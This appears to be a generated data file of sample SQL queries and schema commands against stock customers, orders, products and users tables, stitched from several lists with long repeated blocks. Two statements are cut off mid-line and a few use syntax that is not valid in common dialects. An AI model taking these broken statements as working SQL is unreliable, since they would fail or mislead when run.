SELECT * FROM Customers;
SELECT CustomerName, Email FROM Customers WHERE City = 'Paris';
SELECT ProductID, ProductName, Price FROM Products ORDER BY Price ASC LIMIT 20;
SELECT o.OrderID, c.CustomerName, p.ProductName FROM Orders o JOIN Customers c ON o.CustomerID = c.CustomerID JOIN Products p ON o.ProductID = p.ProductID;
SELECT EmployeeID, FirstName, LastName, Department FROM Employees WHERE Department IN ('Engineering', 'IT');
SELECT COUNT(*) AS TotalProducts FROM Products;
SELECT AVG(Salary) AS AverageSalary FROM Employees GROUP BY Department;
SELECT CustomerName, City, MAX(OrderAmount) AS HighestOrder FROM Customers c JOIN Orders o ON c.CustomerID = o.CustomerID GROUP BY CustomerName, City HAVING HighestOrder > 100;
SELECT * FROM Users WHERE Username LIKE '%admin%';
SELECT OrderID, OrderDate, CustomerID FROM Orders WHERE OrderDate BETWEEN DATE_SUB(CURDATE(), INTERVAL 1 MONTH) AND CURDATE();
INSERT INTO Orders (CustomerID, OrderDate, OrderAmount) VALUES (456, CURDATE(), 350.50);
UPDATE Products SET Price = Price * 1.05 WHERE CategoryID = 2;
DELETE FROM OldData WHERE LastUpdated < DATE_SUB(CURDATE(), INTERVAL 6 MONTH);
ALTER TABLE Customers MODIFY COLUMN PhoneNumber VARCHAR(15);
CREATE TABLE NewEmployees (EmployeeID INT PRIMARY KEY AUTO_INCREMENT, FirstName VARCHAR(50), LastName VARCHAR(50), Department VARCHAR(30));
ALTER TABLE Orders ADD COLUMN Shipped BOOLEAN DEFAULT FALSE;
DROP TABLE TempTable;
GRANT SELECT, INSERT ON Products TO user3;
REVOKE UPDATE ON Customers FROM user2;
CREATE USER new_user IDENTIFIED BY 'strong_password';
ALTER USER admin RENAME TO system_admin;
BEGIN TRANSACTION; UPDATE Inventory SET StockLevel = StockLevel - 1 WHERE ProductID = 789; COMMIT;
CREATE INDEX idx_customer_name ON Customers(CustomerName);
BACKUP DATABASE MyDatabase TO 'backup.sql';
SELECT ProductID, ProductName FROM Products WHERE ProductName IN (SELECT ProductName FROM SearchHistory);
SELECT o.OrderID, c.CustomerName, p.ProductName FROM Orders o LEFT JOIN Customers c ON o.CustomerID = c.CustomerID LEFT JOIN Products p ON o.ProductID = p.ProductID WHERE o.OrderStatus IS NULL;
SELECT CustomerName, City, COUNT(*) AS OrderCount FROM Customers c JOIN Orders o ON c.CustomerID = o.CustomerID GROUP BY CustomerName, City HAVING OrderCount > 5;
CREATE FUNCTION CalculateDiscount(price DECIMAL(10,2), discountRate DECIMAL(5,2)) RETURNS DECIMAL(10,2) BEGIN RETURN price * (1 - discountRate); END;
SELECT * FROM Customers WHERE (City = 'New York' OR City = 'Los Angeles') AND Age BETWEEN 18 AND 30;
UPDATE Orders SET OrderStatus = 'Shipped' WHERE OrderID IN (123, 456, 789);
SELECT ProductID, ProductName, CategoryID FROM Products WHERE CategoryID NOT IN (1, 2);
SELECT CustomerName, Email FROM Customers WHERE Email IS NULL OR Email = '';
ALTER TABLE Orders CHANGE COLUMN OrderDate UpdatedDate DATE;
SELECT * FROM Orders o LIMIT 10 OFFSET 50;
SELECT o.OrderID, c.CustomerName, SUM(oi.Quantity * p.Price) AS TotalAmount FROM Orders o JOIN Customers c ON o.CustomerID = c.CustomerID JOIN OrderItems oi ON o.OrderID = oi.OrderID JOIN Products p ON oi.ProductID = p.ProductID GROUP BY o.OrderID, c.CustomerName;
SELECT EmployeeID, FirstName, LastName, Department FROM Employees WHERE Department LIKE '%Sales%';
UPDATE Customers SET Email = CONCAT(FirstName, '.', LastName, '@example.com') WHERE Email IS NULL OR Email = '';
CREATE VIEW ActiveUsers AS SELECT UserID, Username, Email FROM Users WHERE Active = 1;
SELECT * FROM ActiveUsers WHERE Username = 'john.doe';
DROP VIEW ActiveUsers;
ALTER TABLE Products ADD CONSTRAINT unique_product_nam
SELECT * FROM users;
SELECT id, name FROM employees;
SELECT COUNT(*) FROM orders;
SELECT DISTINCT city FROM customers;
SELECT AVG(salary) FROM employees;
SELECT MAX(price) FROM products;
SELECT MIN(age) FROM students;
SELECT name, age FROM students WHERE age > 18;
SELECT * FROM orders WHERE order_date >= '2023-01-01';
SELECT name FROM employees WHERE department = 'Sales';
INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');
UPDATE users SET email = 'john.doe@example.com' WHERE name = 'John Doe';
DELETE FROM users WHERE id = 10;
CREATE TABLE products (id INT, name VARCHAR(100), price DECIMAL(10, 2));
DROP TABLE products;
ALTER TABLE employees ADD COLUMN phone VARCHAR(15);
SELECT * FROM orders ORDER BY order_date DESC;
SELECT * FROM products WHERE price BETWEEN 10 AND 50;
SELECT * FROM customers WHERE city IN ('New York', 'Los Angeles');
SELECT * FROM employees WHERE name LIKE 'A%';
SELECT COUNT(*) FROM employees WHERE salary > 50000;
SELECT name, COUNT(*) FROM orders GROUP BY name;
SELECT name, SUM(amount) FROM sales GROUP BY name HAVING SUM(amount) > 1000;
SELECT e.name, m.name AS manager_name FROM employees e JOIN employees m ON e.manager_id = m.id;
SELECT * FROM students WHERE age IS NOT NULL;
SELECT * FROM employees WHERE department IS NULL;
SELECT * FROM products WHERE name LIKE '%phone%';
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'John Doe');
SELECT name FROM users WHERE email LIKE '%@example.com';
SELECT employee_id, COUNT(*) FROM attendance GROUP BY employee_id;
SELECT employee_id, MAX(check_in_time) FROM attendance GROUP BY employee_id;
SELECT * FROM employees WHERE salary > (SELECT AVG(salary) FROM employees);
SELECT * FROM orders WHERE order_date < NOW() - INTERVAL '30 days';
SELECT * FROM customers WHERE created_at >= CURRENT_DATE - INTERVAL '1 year';
SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products);
SELECT * FROM employees WHERE department = 'HR' AND salary > 60000;
SELECT * FROM orders WHERE status = 'shipped' OR status = 'delivered';
SELECT * FROM employees WHERE name NOT LIKE 'J%';
SELECT * FROM products WHERE stock < 10;
SELECT * FROM users WHERE created_at BETWEEN '2023-01-01' AND '2023-12-31';
SELECT id, name FROM employees WHERE department_id IN (1, 2, 3);
SELECT * FROM orders WHERE customer_id = 5 AND order_date >= '2023-01-01';
SELECT * FROM employees WHERE salary BETWEEN 30000 AND 70000;
SELECT name, age FROM students ORDER BY age ASC;
SELECT * FROM products WHERE name ILIKE '%laptop%';
SELECT * FROM users WHERE email IS NOT NULL;
SELECT * FROM orders WHERE payment_status = 'pending' AND order_date < NOW() - INTERVAL '7 days';
SELECT * FROM customers WHERE last_purchase_date IS NULL;
SELECT * FROM employees WHERE hire_date >= '2022-01-01' AND hire_date <= '2022-12-31';
SELECT * FROM products WHERE category_id = (SELECT id FROM categories WHERE name = 'Electronics');
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Jane Smith') AND status = 'completed';
SELECT * FROM employees WHERE department = 'IT' AND (salary > 80000 OR experience > 5);
SELECT * FROM products WHERE price < (SELECT MIN(price) FROM products WHERE category_id = 2);
SELECT * FROM orders WHERE total_amount > 1000 AND order_date >= '2023-01-01';
SELECT * FROM users WHERE username NOT IN (SELECT username FROM banned_users);
SELECT * FROM employees WHERE manager_id IS NOT NULL;
SELECT * FROM products WHERE stock > 0 ORDER BY stock DESC;
SELECT * FROM orders WHERE created_at >= NOW() - INTERVAL '1 month';
SELECT * FROM customers WHERE first_name LIKE 'A%' AND last_name LIKE 'B%';
SELECT * FROM employees WHERE department = 'Sales' AND hire_date < '2020-01-01';
SELECT * FROM products WHERE name LIKE '%tablet%' AND price < 300;
SELECT * FROM orders WHERE order_date BETWEEN '2023-01-01' AND '2023-06-30';
SELECT * FROM employees WHERE salary > (SELECT AVG(salary) FROM employees WHERE department = 'Finance');
SELECT * FROM users WHERE created_at >= '2023-01-01' AND is_active = TRUE;
SELECT * FROM orders WHERE status = 'cancelled' AND order_date < NOW() - INTERVAL '30 days';
SELECT * FROM products WHERE category_id = 1 AND price > 50;
SELECT * FROM employees WHERE experience > 10 AND salary < 60000;
SELECT * FROM customers WHERE city = 'Chicago' OR city = 'Houston';
SELECT * FROM orders WHERE payment_method IN ('credit_card', 'paypal');
SELECT * FROM users WHERE last_login >= NOW() - INTERVAL '1 week';
SELECT * FROM products WHERE price > 100 AND stock < 5;
SELECT * FROM employees WHERE department = 'HR' AND (salary < 50000 OR experience < 3);
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE email = 'example@example.com');
SELECT * FROM products WHERE stock > 0 ORDER BY price ASC;
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
SELECT * FROM orders WHERE status = 'completed' AND total_amount > 500;
SELECT * FROM employees WHERE department_id = 3 AND hire_date >= '2021-01-01';
SELECT * FROM products WHERE name LIKE '%case%' AND price < 50;
SELECT * FROM customers WHERE first_name = 'Alice' AND last_name = 'Johnson';
SELECT * FROM orders WHERE order_date >= '2023-01-01' AND status = 'pending';
SELECT * FROM employees WHERE salary > 70000 AND department = 'IT';
SELECT * FROM products WHERE category_id = 2 AND stock > 0;
SELECT * FROM users WHERE email LIKE '%@gmail.com';
SELECT * FROM orders WHERE total_amount BETWEEN 100 AND 500;
SELECT * FROM employees WHERE experience > 5 AND salary < 80000;
SELECT * FROM products WHERE stock < 10 ORDER BY price ASC;
SELECT * FROM customers WHERE city = 'Miami' AND created_at >= '2022-01-01';
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'John Doe') AND order_date >= '2023-01-01';
SELECT * FROM employees WHERE department = 'Marketing' AND salary > 60000;
SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products);
SELECT * FROM users WHERE username NOT IN (SELECT username FROM blocked_users);
SELECT * FROM orders WHERE order_date >= '2023-01-01' AND status = 'shipped';
SELECT * FROM employees WHERE department = 'Finance' AND hire_date < '2020-01-01';
SELECT * FROM products WHERE name LIKE '%charger%' AND price > 20;
SELECT * FROM customers WHERE last_purchase_date IS NOT NULL;
SELECT * FROM orders WHERE payment_status = 'failed' AND order_date < NOW() - INTERVAL '1 month';
SELECT * FROM employees WHERE salary BETWEEN 50000 AND 90000;
SELECT * FROM products WHERE category_id = 3 AND stock > 0;
SELECT * FROM users WHERE email IS NOT NULL;
SELECT * FROM orders WHERE total_amount > 1000 AND order_date >= '2023-01-01';
SELECT * FROM employees WHERE department = 'Sales' AND (hire_date < '2022-01-01' OR salary > 70000);
SELECT * FROM products WHERE price < 100 AND stock > 0;
SELECT * FROM customers WHERE city IN ('New York', 'Los Angeles', 'Chicago');
SELECT * FROM orders WHERE order_date BETWEEN '2023-01-01' AND '2023-06-30';
SELECT * FROM employees WHERE manager_id IS NOT NULL;
SELECT * FROM products WHERE stock < 10 ORDER BY stock ASC;
SELECT * FROM users WHERE username LIKE 'user_%';
SELECT * FROM orders WHERE status = 'processing' AND order_date < NOW() - INTERVAL '5 days';
SELECT * FROM employees WHERE department = 'HR' AND salary > (SELECT AVG(salary) FROM employees WHERE department = 'HR');
SELECT * FROM products WHERE name LIKE '%headphones%' AND price < 150;
SELECT * FROM customers WHERE created_at >= '2022-01-01' AND last_purchase_date IS NOT NULL;
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE email = 'john@example.com') AND status = 'completed';
SELECT * FROM employees WHERE department_id = 1 AND hire_date >= '2021-01-01';
SELECT * FROM products WHERE category_id = 4 AND stock > 0;
SELECT * FROM users WHERE email LIKE '%@yahoo.com';
SELECT * FROM orders WHERE total_amount BETWEEN 200 AND 1000;
SELECT * FROM employees WHERE experience < 2 AND salary < 40000;
SELECT * FROM products WHERE stock < 5 ORDER BY price DESC;
SELECT * FROM customers WHERE city = 'Seattle' AND created_at >= '2023-01-01';
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Jane Doe') AND order_date >= '2023-01-01';
SELECT * FROM employees WHERE department = 'IT' AND salary > 90000;
SELECT * FROM products WHERE price < (SELECT MIN(price) FROM products WHERE category_id = 2);
SELECT * FROM users WHERE username NOT IN (SELECT username FROM banned_users);
SELECT * FROM orders WHERE order_date >= NOW() - INTERVAL '1 month';
SELECT * FROM employees WHERE department = 'Sales' AND (salary < 50000 OR experience < 2);
SELECT * FROM products WHERE name LIKE '%mouse%' AND price < 30;
SELECT * FROM customers WHERE first_name = 'Bob' AND last_name = 'Smith';
SELECT * FROM orders WHERE order_date BETWEEN '2023-01-01' AND '2023-12-31';
SELECT * FROM employees WHERE salary > (SELECT AVG(salary) FROM employees WHERE department = 'Marketing');
SELECT * FROM users WHERE created_at >= '2023-01-01' AND is_active = TRUE;
SELECT * FROM orders WHERE status = 'cancelled' AND order_date < NOW() - INTERVAL '30 days';
SELECT * FROM products WHERE category_id = 1 AND price > 50;
SELECT * FROM employees WHERE experience > 10 AND salary < 60000;
SELECT * FROM customers WHERE city = 'Chicago' OR city = 'Houston';
SELECT * FROM orders WHERE payment_method IN ('credit_card', 'paypal');
SELECT * FROM users WHERE last_login >= NOW() - INTERVAL '1 week';
SELECT * FROM products WHERE price > 100 AND stock < 5;
SELECT * FROM employees WHERE department = 'HR' AND (salary < 50000 OR experience < 3);
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE email = 'example@example.com');
SELECT * FROM products WHERE stock > 0 ORDER BY price ASC;
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
SELECT * FROM orders WHERE status = 'completed' AND total_amount > 500;
SELECT * FROM employees WHERE department_id = 3 AND hire_date >= '2021-01-01';
SELECT * FROM products WHERE name LIKE '%case%' AND price < 50;
SELECT * FROM customers WHERE first_name = 'Alice' AND last_name = 'Johnson';
SELECT * FROM orders WHERE order_date >= '2023-01-01' AND status = 'pending';
SELECT * FROM employees WHERE salary > 70000 AND department = 'IT';
SELECT * FROM products WHERE category_id = 2 AND stock > 0;
SELECT * FROM users WHERE email LIKE '%@gmail.com';
SELECT * FROM orders WHERE total_amount BETWEEN 100 AND 500;
SELECT * FROM employees WHERE experience > 5 AND salary < 80000;
SELECT * FROM products WHERE stock < 10 ORDER BY stock ASC;
SELECT * FROM customers WHERE city = 'Miami' AND created_at >= '2022-01-01';
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'John Doe') AND order_date >= '2023-01-01';
SELECT * FROM employees WHERE department = 'Marketing' AND salary > 60000;
SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products);
SELECT * FROM users WHERE username NOT IN (SELECT username FROM blocked_users);
SELECT * FROM orders WHERE order_date >= '2023-01-01' AND status = 'shipped';
SELECT * FROM employees WHERE department = 'Finance' AND hire_date < '2020-01-01';
SELECT * FROM products WHERE name LIKE '%charger%' AND price > 20;
SELECT * FROM customers WHERE last_purchase_date IS NOT NULL;
SELECT * FROM orders WHERE payment_status = 'failed' AND order_date < NOW() - INTERVAL '1 month';
SELECT * FROM employees WHERE salary BETWEEN 50000 AND 90000;
SELECT * FROM products WHERE category_id = 3 AND stock > 0;
SELECT * FROM users WHERE email IS NOT NULL;
SELECT * FROM orders WHERE total_amount > 1000 AND order_date >= '2023-01-01';
SELECT * FROM employees WHERE department = 'Sales' AND (hire_date < '2022-01-01' OR salary > 70000);
SELECT * FROM products WHERE price < 100 AND stock > 0;
SELECT * FROM customers WHERE city IN ('New York', 'Los Angeles', 'Chicago');
SELECT * FROM orders WHERE order_date BETWEEN '2023-01-01' AND '2023-06-30';
SELECT * FROM employees WHERE manager_id IS NOT NULL;
SELECT * FROM products WHERE stock < 10 ORDER BY stock ASC;
SELECT * FROM users WHERE username LIKE 'user_%';
SELECT * FROM orders WHERE status = 'processing' AND order_date < NOW() - INTERVAL '5 days';
SELECT * FROM employees WHERE department = 'HR' AND salary > (SELECT AVG(salary) FROM employees WHERE department = 'HR');
SELECT * FROM products WHERE name LIKE '%headphones%' AND price < 150;
SELECT * FROM customers WHERE created_at >= '2022-01-01' AND last_purchase_date IS NOT NULL;
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE email = 'john@example.com') AND status = 'completed';
SELECT * FROM employees WHERE department_id = 1 AND hire_date >= '2021-01-01';
SELECT * FROM products WHERE category_id = 4 AND stock > 0;
SELECT * FROM users WHERE email LIKE '%@yahoo.com';
SELECT * FROM orders WHERE total_amount BETWEEN 200 AND 1000;
SELECT * FROM employees WHERE experience < 2 AND salary < 40000;
SELECT * FROM products WHERE stock < 5 ORDER BY price DESC;
SELECT * FROM customers WHERE city = 'Seattle' AND created_at >= '2023-01-01';
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Jane Doe') AND order_date >= '2023-01-01';
SELECT * FROM employees WHERE department = 'IT' AND salary > 90000;
SELECT * FROM products WHERE price < (SELECT MIN(price) FROM products WHERE category_id = 2);
SELECT * FROM users WHERE username NOT IN (SELECT username FROM banned_users);
SELECT * FROM orders WHERE order_date >= NOW() - INTERVAL '1 month';
SELECT * FROM employees WHERE department = 'Sales' AND (salary < 50000 OR experience < 2);
SELECT * FROM products WHERE name LIKE '%mouse%' AND price < 30;
SELECT * FROM customers WHERE first_name = 'Bob' AND last_name = 'Smith';
SELECT * FROM orders WHERE order_date BETWEEN '2023-01-01' AND '2023-12-31';
SELECT * FROM employees WHERE salary > (SELECT AVG(salary) FROM employees WHERE department = 'Marketing');
SELECT * FROM users WHERE created_at >= '2023-01-01' AND is_active = TRUE;
SELECT * FROM orders WHERE status = 'cancelled' AND order_date < NOW() - INTERVAL '30 days';
SELECT * FROM products WHERE category_id = 1 AND price > 50;
SELECT * FROM employees WHERE experience > 10 AND salary < 60000;
SELECT * FROM customers WHERE city = 'Chicago' OR city = 'Houston';
SELECT * FROM orders WHERE payment_method IN ('credit_card', 'paypal');
SELECT * FROM users WHERE last_login >= NOW() - INTERVAL '1 week';
SELECT * FROM products WHERE price > 100 AND stock < 5;
SELECT * FROM employees WHERE department = 'HR' AND (salary < 50000 OR experience < 3);
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE email = 'example@example.com');
SELECT * FROM products WHERE stock > 0 ORDER BY price ASC;
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
SELECT * FROM orders WHERE status = 'completed' AND total_amount > 500;
SELECT * FROM employees WHERE department_id = 3 AND hire_date >= 
INSERT INTO users (name, email, created_at) VALUES ('Alice', 'alice@example.com', NOW());
DELETE FROM users WHERE id = 1;
UPDATE users SET email = 'alice_new@example.com' WHERE name = 'Alice';
ALTER TABLE users ADD COLUMN age INT;
CREATE TABLE orders (id INT PRIMARY KEY, user_id INT, total DECIMAL(10, 2), created_at TIMESTAMP);
DROP TABLE orders;
INSERT INTO products (name, price, stock) VALUES ('Laptop', 999.99, 50);
SELECT * FROM products;
UPDATE products SET stock = stock - 1 WHERE id = 1;
DELETE FROM products WHERE stock = 0;
SELECT COUNT(*) FROM users;
ALTER TABLE products ADD COLUMN category VARCHAR(50);
CREATE INDEX idx_user_email ON users (email);
SELECT * FROM users WHERE email LIKE '%@example.com';
INSERT INTO orders (user_id, total, created_at) VALUES (1, 150.00, NOW());
SELECT * FROM orders WHERE total > 100;
UPDATE orders SET total = total * 0.9 WHERE created_at < NOW() - INTERVAL '1 month';
DELETE FROM orders WHERE total < 50;
SELECT AVG(price) FROM products;
INSERT INTO users (name, email, created_at) VALUES ('Bob', 'bob@example.com', NOW());
UPDATE users SET name = 'Robert' WHERE email = 'bob@example.com';
DELETE FROM users WHERE name = 'Robert';
CREATE TABLE categories (id INT PRIMARY KEY, name VARCHAR(100));
INSERT INTO categories (name) VALUES ('Electronics');
SELECT * FROM categories;
UPDATE categories SET name = 'Home Electronics' WHERE name = 'Electronics';
DELETE FROM categories WHERE name = 'Home Electronics';
SELECT * FROM products WHERE price < 500;
INSERT INTO products (name, price, stock, category) VALUES ('Smartphone', 699.99, 100, 'Electronics');
SELECT * FROM products WHERE category = 'Electronics';
UPDATE products SET price = price * 1.1 WHERE category = 'Electronics';
DELETE FROM products WHERE name = 'Smartphone';
ALTER TABLE users DROP COLUMN age;
CREATE TABLE addresses (id INT PRIMARY KEY, user_id INT, address VARCHAR(255));
INSERT INTO addresses (user_id, address) VALUES (1, '123 Main St');
SELECT * FROM addresses WHERE user_id = 1;
UPDATE addresses SET address = '456 Elm St' WHERE id = 1;
DELETE FROM addresses WHERE id = 1;
SELECT DISTINCT category FROM products;
INSERT INTO products (name, price, stock, category) VALUES ('Tablet', 299.99, 75, 'Electronics');
SELECT COUNT(*) FROM addresses;
UPDATE products SET stock = stock + 10 WHERE id = 2;
DELETE FROM products WHERE id = 3;
SELECT * FROM users WHERE created_at >= '2023-01-01';
INSERT INTO orders (user_id, total, created_at) VALUES (2, 200.00, NOW());
SELECT * FROM orders WHERE user_id = 2;
UPDATE orders SET total = 250.00 WHERE id = 1;
DELETE FROM orders WHERE id = 2;
CREATE TABLE reviews (id INT PRIMARY KEY, product_id INT, user_id INT, rating INT, comment TEXT);
INSERT INTO reviews (product_id, user_id, rating, comment) VALUES (1, 1, 5, 'Great product!');
SELECT * FROM reviews WHERE product_id = 1;
UPDATE reviews SET rating = 4 WHERE id = 1;
DELETE FROM reviews WHERE id = 1;
ALTER TABLE products ADD COLUMN description TEXT;
INSERT INTO products (name, price, stock, category, description) VALUES ('Headphones', 89.99, 200, 'Electronics', 'Noise-cancelling headphones.');
SELECT * FROM products WHERE description LIKE '%Noise-cancelling%';
UPDATE products SET description = 'Wireless noise-cancelling headphones.' WHERE name = 'Headphones';
DELETE FROM products WHERE name = 'Headphones';
CREATE TABLE payment_methods (id INT PRIMARY KEY, user_id INT, method VARCHAR(50));
INSERT INTO payment_methods (user_id, method) VALUES (1, 'Credit Card');
SELECT * FROM payment_methods WHERE user_id = 1;
UPDATE payment_methods SET method = 'PayPal' WHERE id = 1;
DELETE FROM payment_methods WHERE id = 1;
SELECT * FROM users WHERE email IS NOT NULL;
INSERT INTO users (name, email) VALUES ('Charlie', 'charlie@example.com');
UPDATE users SET email = 'charlie_new@example.com' WHERE name = 'Charlie';
DELETE FROM users WHERE email = 'charlie_new@example.com';
CREATE TABLE inventory (id INT PRIMARY KEY, product_id INT, quantity INT);
INSERT INTO inventory (product_id, quantity) VALUES (1, 50);
SELECT * FROM inventory WHERE product_id = 1;
UPDATE inventory SET quantity = quantity - 5 WHERE product_id = 1;
DELETE FROM inventory WHERE product_id = 1;
ALTER TABLE users ADD COLUMN phone VARCHAR(15);
INSERT INTO users (name, email, phone) VALUES ('Diana', 'diana@example.com', '123-456-7890');
SELECT * FROM users WHERE phone IS NOT NULL;
UPDATE users SET phone = '987-654-3210' WHERE name = 'Diana';
DELETE FROM users WHERE phone = '987-654-3210';
CREATE TABLE sessions (id INT PRIMARY KEY, user_id INT, session_token VARCHAR(255), created_at TIMESTAMP);
INSERT INTO sessions (user_id, session_token, created_at) VALUES (1, 'token123', NOW());
SELECT * FROM sessions WHERE user_id = 1;
UPDATE sessions SET session_token = 'token456' WHERE id = 1;
DELETE FROM sessions WHERE id = 1;
SELECT * FROM products WHERE stock < 20;
INSERT INTO products (name, price, stock) VALUES ('Smartwatch', 199.99, 30);
UPDATE products SET stock = stock + 15 WHERE name = 'Smartwatch';
DELETE FROM products WHERE name = 'Smartwatch';
CREATE TABLE discounts (id INT PRIMARY KEY, product_id INT, discount_percentage INT);
INSERT INTO discounts (product_id, discount_percentage) VALUES (1, 10);
SELECT * FROM discounts WHERE product_id = 1;
UPDATE discounts SET discount_percentage = 15 WHERE id = 1;
DELETE FROM discounts WHERE id = 1;
ALTER TABLE products ADD COLUMN discount_price DECIMAL(10, 2);
INSERT INTO products (name, price, stock, discount_price) VALUES ('Bluetooth Speaker', 79.99, 100, 69.99);
SELECT * FROM products WHERE discount_price < price;
UPDATE products SET discount_price = price * 0.8 WHERE name = 'Bluetooth Speaker';
DELETE FROM products WHERE name = 'Bluetooth Speaker';
CREATE TABLE user_roles (id INT PRIMARY KEY, user_id INT, role VARCHAR(50));
INSERT INTO user_roles (user_id, role) VALUES (1, 'admin');
SELECT * FROM user_roles WHERE user_id = 1;
UPDATE user_roles SET role = 'super_admin' WHERE id = 1;
DELETE FROM user_roles WHERE id = 1;
SELECT * FROM users WHERE role = 'admin';
INSERT INTO products (name, price, stock) VALUES ('Gaming Console', 499.99, 25);
UPDATE products SET stock = stock - 1 WHERE name = 'Gaming Console';
DELETE FROM products WHERE name = 'Gaming Console';
CREATE TABLE logs (id INT PRIMARY KEY, user_id INT, action VARCHAR(255), created_at TIMESTAMP);
INSERT INTO logs (user_id, action, created_at) VALUES (1, 'User created', NOW());
SELECT * FROM logs WHERE user_id = 1;
UPDATE logs SET action = 'User updated' WHERE id = 1;
DELETE FROM logs WHERE id = 1;
SELECT * FROM orders WHERE created_at >= '2023-01-01';
INSERT INTO orders (user_id, total) VALUES (1, 250.00);
SELECT * FROM orders WHERE total > 200;
UPDATE orders SET total = total + 50 WHERE user_id = 1;
DELETE FROM orders WHERE total < 100;
CREATE TABLE favorites (id INT PRIMARY KEY, user_id INT, product_id INT);
INSERT INTO favorites (user_id, product_id) VALUES (1, 1);
SELECT * FROM favorites WHERE user_id = 1;
UPDATE favorites SET product_id = 2 WHERE id = 1;
DELETE FROM favorites WHERE id = 1;
ALTER TABLE users ADD COLUMN address VARCHAR(255);
INSERT INTO users (name, email, address) VALUES ('Eve', 'eve@example.com', '789 Oak St');
SELECT * FROM users WHERE address IS NOT NULL;
UPDATE users SET address = '101 Pine St' WHERE name = 'Eve';
DELETE FROM users WHERE address = '101 Pine St';
CREATE TABLE notifications (id INT PRIMARY KEY, user_id INT, message TEXT, created_at TIMESTAMP);
INSERT INTO notifications (user_id, message, created_at) VALUES (1, 'Welcome!', NOW());
SELECT * FROM notifications WHERE user_id = 1;
UPDATE notifications SET message = 'Updated Welcome!' WHERE id = 1;
DELETE FROM notifications WHERE id = 1;
SELECT * FROM products WHERE price > 100;
INSERT INTO products (name, price, stock) VALUES ('Electric Kettle', 49.99, 150);
UPDATE products SET stock = stock - 10 WHERE name = 'Electric Kettle';
DELETE FROM products WHERE name = 'Electric Kettle';
CREATE TABLE subscriptions (id INT PRIMARY KEY, user_id INT, plan VARCHAR(50), start_date TIMESTAMP);
INSERT INTO subscriptions (user_id, plan, start_date) VALUES (1, 'Premium', NOW());
SELECT * FROM subscriptions WHERE user_id = 1;
UPDATE subscriptions SET plan = 'Basic' WHERE id = 1;
DELETE FROM subscriptions WHERE id = 1;
SELECT * FROM users WHERE created_at < '2023-01-01';
INSERT INTO users (name, email) VALUES ('Frank', 'frank@example.com');
UPDATE users SET email = 'frank_new@example.com' WHERE name = 'Frank';
DELETE FROM users WHERE email = 'frank_new@example.com';
CREATE TABLE sessions (id INT PRIMARY KEY, user_id INT, session_token VARCHAR(255), created_at TIMESTAMP);
INSERT INTO sessions (user_id, session_token, created_at) VALUES (1, 'session123', NOW());
SELECT * FROM sessions WHERE user_id = 1;
UPDATE sessions SET session_token = 'session456' WHERE id = 1;
DELETE FROM sessions WHERE id = 1;
SELECT * FROM products WHERE stock < 10;
INSERT INTO products (name, price, stock) VALUES ('Portable Charger', 29.99, 200);
UPDATE products SET stock = stock + 20 WHERE name = 'Portable Charger';
DELETE FROM products WHERE name = 'Portable Charger';
CREATE TABLE user_preferences (id INT PRIMARY KEY, user_id INT, preference VARCHAR(50));
INSERT INTO user_preferences (user_id, preference) VALUES (1, 'Dark Mode');
SELECT * FROM user_preferences WHERE user_id = 1;
UPDATE user_preferences SET preference = 'Light Mode' WHERE id = 1;
DELETE FROM user_preferences WHERE id = 1;
SELECT * FROM users WHERE email LIKE '%@gmail.com';
INSERT INTO users (name, email) VALUES ('Grace', 'grace@example.com');
UPDATE users SET email = 'grace_new@example.com' WHERE name = 'Grace';
DELETE FROM users WHERE email = 'grace_new@example.com';
CREATE TABLE user_activity (id INT PRIMARY KEY, user_id INT, activity VARCHAR(255), created_at TIMESTAMP);
INSERT INTO user_activity (user_id, activity, created_at) VALUES (1, 'Logged In', NOW());
SELECT * FROM user_activity WHERE user_id = 1;
UPDATE user_activity SET activity = 'Logged Out' WHERE id = 1;
DELETE FROM user_activity WHERE id = 1;
SELECT * FROM orders WHERE user_id = 1;
INSERT INTO orders (user_id, total) VALUES (1, 300.00);
UPDATE orders SET total = total + 50 WHERE user_id = 1;
DELETE FROM orders WHERE total < 200;
CREATE TABLE coupons (id INT PRIMARY KEY, code VARCHAR(50), discount INT);
INSERT INTO coupons (code, discount) VALUES ('SAVE10', 10);
SELECT * FROM coupons WHERE code = 'SAVE10';
UPDATE coupons SET discount = 15 WHERE code = 'SAVE10';
DELETE FROM coupons WHERE code = 'SAVE10';
SELECT * FROM products WHERE price BETWEEN 50 AND 100;
INSERT INTO products (name, price, stock) VALUES ('Coffee Maker', 79.99, 80);
UPDATE products SET stock = stock - 5 WHERE name = 'Coffee Maker';
DELETE FROM products WHERE name = 'Coffee Maker';
CREATE TABLE wishlists (id INT PRIMARY KEY, user_id INT, product_id INT);
INSERT INTO wishlists (user_id, product_id) VALUES (1, 1);
SELECT * FROM wishlists WHERE user_id = 1;
UPDATE wishlists SET product_id = 2 WHERE id = 1;
DELETE FROM wishlists WHERE id = 1;
ALTER TABLE users ADD COLUMN last_login TIMESTAMP;
INSERT INTO users (name, email, last_login) VALUES ('Hannah', 'hannah@example.com', NOW());
SELECT * FROM users WHERE last_login IS NOT NULL;
UPDATE users SET last_login = NOW() WHERE name = 'Hannah';
DELETE FROM users WHERE last_login < NOW() - INTERVAL '1 year';
CREATE TABLE transactions (id INT PRIMARY KEY, order_id INT, amount DECIMAL(10, 2), created_at TIMESTAMP);
INSERT INTO transactions (order_id, amount, created_at) VALUES (1, 150.00, NOW());
SELECT * FROM transactions WHERE order_id = 1;
UPDATE transactions SET amount = amount + 10 WHERE id = 1;
DELETE FROM transactions WHERE id = 1;
